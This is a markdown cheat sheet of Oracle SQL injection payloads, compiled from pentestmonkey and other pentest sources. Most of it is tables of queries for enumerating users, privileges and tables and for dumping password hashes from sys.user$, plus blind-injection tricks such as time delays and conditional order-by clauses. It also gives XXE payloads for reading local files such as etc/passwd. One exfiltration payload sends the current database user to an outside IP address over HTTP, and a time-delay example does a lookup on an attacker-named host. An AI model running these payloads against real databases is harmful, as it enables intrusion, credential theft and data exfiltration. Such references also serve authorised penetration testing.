# SQLi - Oracle

## From:

- http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
- http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/
- http://www.securitytube.net/video/6138
- https://portswigger.net/web-security/sql-injection/cheat-sheet
 
## Enumeration

| Enumerate    | Command                 |
|--------------|-------------------------|
| Current User | `SELECT user FROM dual` |
|Database version |	`SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';` <br> `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';` <br> `SELECT version FROM v$instance;`
|Current Database | `SELECT global_name FROM global_name;` <br> `SELECT name FROM v$database;`<br> `SELECT instance_name FROM v$instance;` <br> `SELECT SYS.DATABASE_NAME FROM DUAL;` |
| List Databases | `SELECT DISTINCT owner FROM all_tables;`|
|List Users | `SELECT username FROM all_users ORDER BY username;`|
| List Passwords (Privileged only) | `SELECT username FROM all_users ORDER BY username;` <br> `SELECT name,spare4 FROM sys.user$`|
| List Tables | `SELECT table_name FROM all_tables;` |
| Current Permissions | `SELECT * FROM DBA_SYS_PRIVS;` <br> `SELECT * FROM DBA_TAB_PRIVS;` <br> `SELECT * FROM DBA_ROLE_PRIVS;`
 
Dumping
You can dump tables very similar to any other query language.

```sql
SELECT * FROM <tablename>
```
 
## Notes

There is no LIMIT clause in Oracle. If the database is Oracle 12c R1 or above, use instead `FETCH NEXT 10 ROWS ONLY`, e.g.

```sql
SELECT * FROM APP_HISTORY  FETCH NEXT 100 ROWS ONLY
```
 
## Local file access

```sql
select extractvalue(xmltype('<!ENTITY xxe SYSTEM "etc/passwd">]>'||'&'||'xxe;'),'/l') from dual;
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "etc/passwd"> %remote; %param1;]>'),'/l') from dual;
```

## Data Exfiltration

https://blog.netspi.com/advisory-xxe-injection-oracle-database-cve-2014-6577/
https://exploitstube.com/sql-injection-abusing-xxe-in-oracle.html

```sql
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://66.35.63.202/'||(SELECT user FROM dual)||'"> %remote; %param1;]>'),'/l') from dual;
```

## Pentestmonkey - Oracle SQLi

http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
 
Some of the queries in the table below can only be run by an admin.  These are marked with “– priv” at the end of the query.

| Enumerate    | Command                 |
|--------------|-------------------------|
| Version      | `SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;` <br>	`SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;`<br>`SELECT version FROM v$instance;`|
|Comments | `SELECT 1 FROM dual — comment` <br> –NB: `SELECT` statements must have a `FROM` clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.|
| Current User | `SELECT user FROM dual` |
| List Users | `SELECT username FROM all_users ORDER BY username;` <br> `SELECT name FROM sys.user$; — priv` |
| List Password Hashes | `SELECT name, password, astatus FROM sys.user$ — priv`, <= 10g.  astatus tells you if acct is locked <br>  `SELECT name,spare4 FROM sys.user$ — priv`, 11g |
| Password Cracker | `checkpwd` will crack the DES-based hashes from Oracle 8, 9 and 10. |
| List Privileges | `SELECT * FROM session_privs;` — current privs <br> `SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’;` — priv, list a user’s privs <br> `SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’;` — priv, find users with a particular priv <br> `SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;` |
| List DBA Accounts | `SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’;` — priv, list DBAs, DBA roles |
| Current Database | `SELECT global_name FROM global_name;` <br> `SELECT name FROM v$database;` <br> `SELECT instance_name FROM v$instance;` <br> `SELECT SYS.DATABASE_NAME FROM DUAL;`|
| List Databases | `SELECT DISTINCT owner FROM all_tables;` — list schemas (one per user)<br> –Also query TNS listener for other databases.  See tnscmd (services | status).|
| List Columns | `SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;`<br> `SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;`|
| List Tables | `SELECT table_name FROM all_tables;`<br> `SELECT owner, table_name FROM all_tables;`|
| Find Tables From Column Name | `SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;` — NB: table names are upper case|
| Select Nth Row | `SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9;` — gets 9th row (rows numbered from 1)
| Select Nth Char | `SELECT substr(‘abcd’, 3, 1) FROM dual;` — gets 3rd character, ‘c’ |
| Bitwise AND | `SELECT bitand(6,2) FROM dual; — returns 2` <br> `SELECT bitand(6,1) FROM dual; — returns0`|
|ASCII Value -> Char | `SELECT chr(65) FROM dual; — returns A` |
|Char -> ASCII Value | `SELECT ascii(‘A’) FROM dual;` — returns 65 |
| Casting | `SELECT CAST(1 AS char) FROM dual;`<br>`SELECT CAST(’1′ AS int) FROM dual;`|
|String Concatenation| `SELECT ‘A’ || ‘B’ FROM dual;` — returns AB|
|If Statement | `BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;` — doesn’t play well with SELECT statements|
|Case Statement | `SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;` — returns 1 <br>`SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual;` — returns 2|
| Avoiding Quotes | `SELECT chr(65) || chr(66) FROM dual;` — returns AB
| Time Delay | `BEGIN DBMS_LOCK.SLEEP(5); END;` — priv, can’t seem to embed this in a SELECT <br> `SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual;` — if reverse looks are slow <br> `SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual;` — if forward lookups are slow <br> `SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;` — if outbound TCP is filtered / slow<br> – Also see Heavy Queries to create a time delay |
| Make DNS Requests | `SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;` <br>`SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;`|
| Command Execution | Javacan be used to execute commands if it’s installed.ExtProc can sometimes be used too, though it normally failed for me. :-( |
| Local File Access | `UTL_FILE` can sometimes be used.  Check that the following is non-null: `SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;` <br>Java can be used to read and write files if it’s installed (it is not available in Oracle Express).|
| Hostname, IP Address | `SELECT UTL_INADDR.get_host_name FROM dual;` <br> `SELECT host_name FROM v$instance;` <br> `SELECT UTL_INADDR.get_host_address FROM dual;` — gets IP address <br> `SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual;` — gets hostnames|
| Location of DB files | `SELECT name FROM V$DATAFILE;`|
| Default/System Databases | `SYSTEM`<br>`SYSAUX`

## Misc Tips

In no particular order, here are some suggestions from pentestmonkey readers.
From Christian Mehlmauer:
| Enumerate    | Command                 |
|--------------|-------------------------|
| Get all tablenames in one string | `select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables` –  when using union based SQLI with only one row|
| Blind SQLI in order by clause	| `order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end` — you must know 2 column names with the same datatype|